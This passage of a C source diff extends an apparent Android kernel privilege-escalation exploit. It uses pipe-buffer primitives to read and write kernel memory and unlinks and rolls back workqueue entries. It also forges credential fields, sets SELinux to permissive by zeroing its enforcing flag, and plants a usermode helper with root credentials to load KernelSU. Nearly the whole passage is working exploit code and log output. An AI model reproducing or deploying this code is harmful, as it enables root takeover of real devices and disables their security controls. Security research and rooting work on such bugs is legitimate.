+         * writes sub_info->retval (+0x54) and completion.done (+0x800)
+         * through the linear alias of this very page, and the page is
+         * ours to read -- no pipe primitive needed (which may have been
+         * clobbered by then). */
+        int rv = *(int *)(mark + 0x154);
+        unsigned int done = *(unsigned int *)(mark + 0x800);
+        unsigned long long fb0 = *(unsigned long long *)(mark + 0x28);
+        unsigned long long fb2 = *(unsigned long long *)(mark + 0x38);
+
+        logf("[+] umh sub_info retval=%d completion.done=%u\n", rv, done);
+        logf("[+] umh fake buf page=%#llx off/len=%#llx\n", fb0, fb2);
+        logf("[+] umh work data=%#llx next=%#llx prev=%#llx func=%#llx\n",
+             *(unsigned long long *)(mark + 0x100),
+             *(unsigned long long *)(mark + 0x108),
+             *(unsigned long long *)(mark + 0x110),
+             *(unsigned long long *)(mark + 0x118));
+    }
+    if (!ready && pub_entry)
+    {
+        /*
+         * The work may still be linked in the pool worklist.  Exiting
+         * with it linked is a guaranteed panic: our user page goes away
+         * and the next worker to touch the pool walks freed memory.
+         * Unlink it with a proper list_del (other works may sit behind
+         * it) and roll the pwq counters back.
+         */
+        unsigned long long cur = 0, nxt = 0, prv = 0;
+        unsigned int v32r;
+
+        if (user_pipe_read(pf[0], mark, pub_worklist, &cur, 8) == 8 &&
+            cur == pub_entry)
+        {
+            nxt = *(unsigned long long *)(mark + 0x108);
+            prv = *(unsigned long long *)(mark + 0x110);
+            /* next->prev = prev; prev->next = next */
+            user_pipe_write(pf[1], mark, nxt + 8, &prv, 8);
+            user_pipe_write(pf[1], mark, prv, &nxt, 8);
+            v32r = rb_inf;
+            user_pipe_write(pf[1], mark, rb_inflight_addr, &v32r, 4);
+            v32r = rb_act;
+            user_pipe_write(pf[1], mark,
+                            pwq + PWQ_NR_ACTIVE_OFF, &v32r, 4);
+            v32r = rb_ref;
+            user_pipe_write(pf[1], mark, pwq + PWQ_REFCNT_OFF, &v32r, 4);
+            logf("[+] umh work unlinked next=%#llx prev=%#llx "
+                 "+ counters rolled back\n", nxt, prv);
+        }
+        else
+            logf("[+] umh work already consumed (list next=%#llx)\n", cur);
+    }
+    /*
+     * Restore the original pipe-buffer array so a later process teardown
+     * frees a valid kmalloc object instead of the user page.
+     */
+    if (g_pipe_bufs)
+        user_pipe_write(pf[1], mark, g_pipe_addr + PIPE_INFO_BUF_OFF,
+                        &g_pipe_bufs, sizeof(g_pipe_bufs));
+    else
+        logf("[!] umh original pipe bufs not leaked; skip restore\n");
+
+    /* The helper (real root cred) runs the stage script; wait for it. */
+    {
+        int ksu_ok = 0;
+
+        for (int i = 0; i < 200; i++)
+        {
+            FILE *mf = fopen("/proc/modules", "r");
+            char line[256];
+
+            ksu_ok = 0;
+            if (mf)
+            {
+                while (fgets(line, sizeof(line), mf))
+                    if (!strncmp(line, "kernelsu", 8))
+                        ksu_ok = 1;
+                fclose(mf);
+            }
+            if (ksu_ok)
+                break;
+            usleep(100000);
+        }
+        if (ksu_ok)
+            logf("KSU_LOADED\n");
+        else
+            logf("KSU_MISSING\n");
+    }
+    logf("[+] umhpipe done held=%d ready=%d\n", g_held, ready);
+    if (g_held)
+        park_forever("zombies held");
+    if (!ready && pub_entry)
+        park_forever("umh work pending -- holding the page (do not kill)");
+    return 0;
+}
+
 int main(int argc, char **argv)
 {
     unsigned char *raw;
     int shell_mode = 0, leak_only = 0, ids_only = 0;
+    int umhpipe_mode = 0;
 
     setvbuf(stdout, NULL, _IONBF, 0);
+    /*
+     * Detach from the caller's session/process group immediately: when the
+     * Shizuku UserService that spawned us is torn down it kills its process
+     * group, and our death would let init reap the held zombies (stale
+     * timer nodes) -- a guaranteed kernel panic.  From our own session only
+     * a direct kill or reboot can end us.
+     */
+    (void)setsid();
     if (argc > 1 && !strcmp(argv[1], "wait"))
         return wait_child_main(argc > 2 ? argv[2] : "verify");
     if (argc > 1 && !strcmp(argv[1], "setshell"))
         return setshell_main(argc > 2 ? argv[2] : "shell");
+    if (argc > 1 && !strcmp(argv[1], "setksu"))
+        return setksu_main();
+    if (argc > 1 && !strcmp(argv[1], "--umh"))
+        return setksu_main();
 
     if (argc > 1 && !strcmp(argv[1], "shell"))
         shell_mode = 1;
@@ -2528,6 +3739,13 @@ int main(int argc, char **argv)
         g_fake_stage = 1;
     if (argc > 1 && !strcmp(argv[1], "umh"))
         g_umh_stage = 1;
+    if (argc > 1 && !strcmp(argv[1], "umhpipe"))
+        umhpipe_mode = 1;
+    if (argc > 1 && !strcmp(argv[1], "umhread"))
+    {
+        umhpipe_mode = 1;
+        g_umh_dry = 1;
+    }
 
     raw = malloc(48u << 20);
     if (!raw)
@@ -2556,8 +3774,19 @@ int main(int argc, char **argv)
     kick_rss();
     usleep(50000);
 
-    if (discover_page_types(raw) != 0)
-        return 1;
+    {
+        int disc_ok = 0;
+
+        for (int t = 0; t < 3 && !disc_ok; t++)
+        {
+            if (discover_page_types(raw) == 0)
+                disc_ok = 1;
+            else
+                logf("[-] page type discovery retry %d\n", t + 1);
+        }
+        if (!disc_ok)
+            return 1;
+    }
     if (ids_only)
         return 0;
 
@@ -2568,6 +3797,16 @@ int main(int argc, char **argv)
         return 1;
     }
     prefill_timers(PREFILL_TIMERS);
+
+    /* The umhpipe chain is self-contained: no child cred leak is needed,
+     * the KASLR slide comes from the plant's own trace sites. */
+    if (umhpipe_mode)
+    {
+        int rc = umhpipe_main(raw);
+
+        free(raw);
+        return rc;
+    }
 
     pid_t C = -1;
     int go_fd = -1, st_fd = -1;
@@ -2611,7 +3850,7 @@ int main(int argc, char **argv)
         if (shell_mode)
         {
             if (stage_write(0, 0, "selinux", raw, NULL,
-                            SELINUX_STATE_STATIC - 7))
+                            SELINUX_ENFORCE_ZAP))
                 park_forever("selinux write failed");
             logf("[+] selinux_state.enforcing cleared (permissive until "
                  "reboot)\n");
@@ -2630,7 +3869,7 @@ int main(int argc, char **argv)
          * Diagnostic: zero-plant selinux_state.enforcing (offset 0) first.
          * getenforce then reveals whether the rb_erase write lands at all.
          */
-        if (stage_write(0, 0, "selinux", raw, NULL, SELINUX_STATE_STATIC - 7))
+        if (stage_write(0, 0, "selinux", raw, NULL, SELINUX_ENFORCE_ZAP))
             logf("[-] selinux plant failed (write did not fire)\n");
         else
             logf("[+] selinux plant done; check getenforce\n");
@@ -2654,7 +3893,7 @@ int main(int argc, char **argv)
          */
         if (!g_slide_set)
             park_forever("no KASLR slide");
-        if (stage_write(0, 0, "selinux", raw, NULL, SELINUX_STATE_STATIC - 7))
+        if (stage_write(0, 0, "selinux", raw, NULL, SELINUX_ENFORCE_ZAP))
             park_forever("selinux write failed");
         logf("[+] selinux permissive\n");
         {
@@ -2737,7 +3976,7 @@ int main(int argc, char **argv)
          * padding -- zeroing is a no-op while uncontended), plus padding,
          * plus enforcing itself.  initialized stays 1.
          */
-        if (stage_write(SELINUX_STATE_STATIC - 7 + g_slide, 0,
+        if (stage_write(SELINUX_ENFORCE_ZAP + g_slide, 0,
                         "selinux", raw, NULL, 0))
             park_forever("selinux write failed");
         if (read_panic_on_warn() != 0 &&
@@ -2754,6 +3993,13 @@ int main(int argc, char **argv)
             park_forever("fake uid fix failed");
         if (stage_write(fc.A + 0x14, 0, "fake_euid", raw, NULL, 0))
             park_forever("fake euid fix failed");
+        /*
+         * suid/sgid sit at +0xC and land on the node's target field
+         * (sgid = garbage low bits of &task->cred).  Zero them too so no
+         * forged-cred process ever carries a junk gid anywhere.
+         */
+        if (stage_write(fc.A + 0xC, 0, "fake_suid", raw, NULL, 0))
+            park_forever("fake suid fix failed");
     }
     logf("[+] cred writes landed, waking child\n");
 
@@ -2820,6 +4066,32 @@ int main(int argc, char **argv)
          * zombies held, park instead: the pools are drained by then, so
          * parking is cheap and the phone stays responsive.
          */
+        /*
+         * Only free the spray pool once the script confirmed that nothing
+         * survives holding the forged cred: the cred is a node in one of
+         * these pages, and a dangling cred in a live process corrupts
+         * kernel memory the moment it is touched (su handling, or
+         * exit_creds when init's cleanup kills the holder).
+         */
+        {
+            char ok[16] = {0};
+            int cfd = open("/data/local/tmp/samtimer/cleanup.ok", O_RDONLY);
+
+            if (cfd >= 0)
+            {
+                (void)!read(cfd, ok, sizeof(ok) - 1);
+                close(cfd);
+            }
+            if (strncmp(ok, "done", 4))
+            {
+                logf("[!] cleanup not confirmed (\"%s\") -- keeping the "
+                     "spray pool alive; park\n",
+                     ok);
+                g_cred_live = 1;
+                logf("PARKED_AFTER_SUCCESS\n");
+                park_forever("cred holder may remain; holding spray pool");
+            }
+        }
         drain_spray(1);
         logf("[+] fake pool drained; KSU holds root now\n");
         if (g_held)
